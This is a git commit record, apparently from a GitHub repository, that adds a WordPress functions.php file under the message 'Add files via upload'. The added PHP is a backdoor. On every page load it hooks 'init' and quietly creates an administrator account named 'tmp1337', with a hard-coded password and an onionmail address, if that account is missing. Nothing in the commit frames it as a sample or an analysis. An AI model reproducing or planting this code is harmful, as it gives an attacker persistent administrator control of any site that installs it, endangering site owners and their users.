b759ea58fff52db4f7f2dc21f31cf412b4f2e8bf
pwnsauce403 <40787695+pwnsauce403@users.noreply.github.com>
2024-07-27 12:50:02 +0700

    Add files via upload

---
+++ tahi/functions.php
@@ -0,0 +1,11 @@
+function addadmin(){
+$login = 'tmp1337';
+$passw = 'tmp#1337';
+$email = 'vxodk1337@onionmail.org';
+if ( !username_exists( $login ) && !email_exists( $email ) ) {
+$user_id = wp_create_user( $login, $passw, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+}
+}
+add_action('init','addadmin');
